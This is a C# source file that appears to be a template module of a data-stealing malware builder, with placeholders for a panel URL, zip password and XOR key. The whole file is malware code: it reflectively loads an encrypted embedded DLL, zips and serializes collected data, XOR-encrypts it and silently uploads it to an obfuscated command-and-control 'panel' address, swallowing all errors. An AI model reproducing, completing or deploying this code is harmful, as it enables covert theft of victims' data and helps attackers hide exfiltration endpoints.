using System;
using System.IO;
using System.Linq;
using System.Text;

namespace TRONRANDOM_NAME
{
    internal class TRONRANDOM_CLASS
    {
        public static byte[] TRON_chars = Convert.FromBase64String("YWJjZGVmZ2hpamtsbW5vcHF1c3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjIzNDU2Nw==");
        public static string TRON_fff = Environment.GetEnvironmentVariable("programdata");

        public static void TRONRANDOM_Start(object[] TRON_data)
        {
            try
            {
                System.Reflection.Assembly TRON_s18 = System.Reflection.Assembly.Load(TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_decompress(TRON_decrypt("[zippwd]", TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_loadassembly("[zipdll]"))));
                Type TRON_s19 = TRON_s18.GetType("Ionic.Zip.ZipFile");

                object TRON_s20 = Activator.CreateInstance(TRON_s19);

                System.Reflection.MethodInfo TRON_s21 = TRON_s19.GetMethod("ToZipStream");
                object res = TRON_s21.Invoke(TRON_s20, new object[] { TRON_data[0] });

                byte[] TRON_LOG = TRON_SerializeToStream(res);

               
                new System.Net.WebClient().UploadString(TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_dcr("[panel]"), Convert.ToBase64String(Encoding.UTF8.GetBytes(TRON_XORCipher(Convert.ToBase64String(Encoding.UTF8.GetBytes(TRON_data[1].ToString())) + ":" + Convert.ToBase64String(TRON_LOG), "[xor_decrypt]"))));
            }
            catch
            {
            }
        }
        

        static string TRON_XORCipher(string TRON_data, string TRON_key)
        {
            int TRON_dataLen = TRON_data.Length;
            int TRON_keyLen = TRON_key.Length;
            char[] TRON_output = new char[TRON_dataLen];

            for (int TRON_i = 0; TRON_i < TRON_dataLen; ++TRON_i)
                TRON_output[TRON_i] = (char)(TRON_data[TRON_i] ^ TRON_key[TRON_i % TRON_keyLen]);

            return new string(TRON_output);
        }

        static byte[] TRON_loadassembly(string TRON_s8)
        {
            System.Reflection.Assembly TRON_s5 = System.Reflection.Assembly.GetExecutingAssembly();
            using (Stream TRON_s7 = TRON_s5.GetManifestResourceStream(TRON_s8))
            {
                byte[] TRON_s6 = new byte[TRON_s7.Length];
                TRON_s7.Read(TRON_s6, 0, TRON_s6.Length);
                return TRON_s6;
            }
        }

        static byte[] TRON_decompress(byte[] TRON_s10)
        {
            using (MemoryStream TRON_s12 = new MemoryStream(TRON_s10))
            {
                byte[] TRON_s13 = new byte[4];
                TRON_s12.Read(TRON_s13, 0, 4);
                int TRON_s11 = BitConverter.ToInt32(TRON_s13, 0);
                using (System.IO.Compression.GZipStream TRON_s8 = new System.IO.Compression.GZipStream(TRON_s12,
                    System.IO.Compression.CompressionMode.Decompress))
                {
                    byte[] result = new byte[TRON_s11];
                    TRON_s8.Read(result, 0, TRON_s11);
                    return result;
                }
            }
        }

        static byte[] TRON_SerializeToStream(object o)
        {
            var TRON_stream = new MemoryStream();
            var TRON_formatter = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            TRON_formatter.Serialize(TRON_stream, o);
            return TRON_stream.ToArray();
        }

        static string TRON_dcr(string input)
        {
            return Encoding.UTF8.GetString(TRON_s24(TRON_data(input)));
        }

        static byte[] TRON_s24(string s1)
        {
            string s2 = s1.TrimEnd('=').ToUpper().ToCharArray().Select(c => Convert.ToString(Encoding.UTF8.GetString(TRON_chars).Split('z')[1].IndexOf(c), 2).PadLeft(5, '0')).Aggregate((a, b) => a + b);
            return Enumerable.Range(0, s2.Length / 8).Select(i => Convert.ToByte(s2.Substring(i * 8, 8), 2)).ToArray();
        }

        static string TRON_data(string TRON_s3)
        {
            return TRON_s3.Remove(Convert.ToInt32(Encoding.UTF8.GetString(Convert.FromBase64String("MA=="))), 1);
        }

        static byte[] TRON_decrypt(string TRON_s7, byte[] TRON_s8)
        {
            System.Security.Cryptography.SymmetricAlgorithm TRON_s9 = System.Security.Cryptography.Rijndael.Create();
            System.Security.Cryptography.ICryptoTransform TRON_s10 = TRON_s9.CreateDecryptor(new System.Security.Cryptography.PasswordDeriveBytes(TRON_s7, null).GetBytes(16), new byte[16]);
            MemoryStream TRON_s11 = new MemoryStream();
            System.Security.Cryptography.CryptoStream TRON_s12 = new System.Security.Cryptography.CryptoStream(TRON_s11, TRON_s10, System.Security.Cryptography.CryptoStreamMode.Write);
            TRON_s12.Write(TRON_s8, 0, TRON_s8.Length);
            TRON_s12.FlushFinalBlock();
            return TRON_s11.ToArray();

        }

    }
}
